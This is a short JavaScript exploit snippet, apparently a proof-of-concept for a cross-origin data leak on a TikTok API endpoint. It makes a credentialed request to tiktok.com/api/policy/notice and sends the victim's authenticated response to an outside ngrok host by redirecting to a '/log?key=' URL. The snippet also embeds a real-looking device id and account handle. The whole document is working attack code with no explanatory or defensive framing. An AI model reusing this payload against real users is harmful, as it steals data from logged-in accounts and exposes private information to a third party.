
var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/api/policy/notice/?aid=1988&app_language=en&app_name=tiktok_web&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20x86_64&browser_version=5.0%20%28X11%29&channel=tiktok_web&cookie_enabled=true&device_id=7173739633825187330&device_platform=web_pc&focus_state=true&from_page=user&history_len=6&is_fullscreen=false&is_page_visible=true&locale=en&os=linux&priority_region=&referer=https%3A%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%2540cancerzh12&region=ID&root_referer=https%3A%2F%2Fwww.tiktok.com%2F%40cancerzh12&screen_height=741&screen_width=1440&tz_name=Asia%2FJakarta&verifyFp=verify_lki9wzzk_nclnsVaZ_HEIZ_4msR_Aqgv_R4ADUIKJ7JJV&webcast_language=en");
xhr.withCredentials = true;
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};

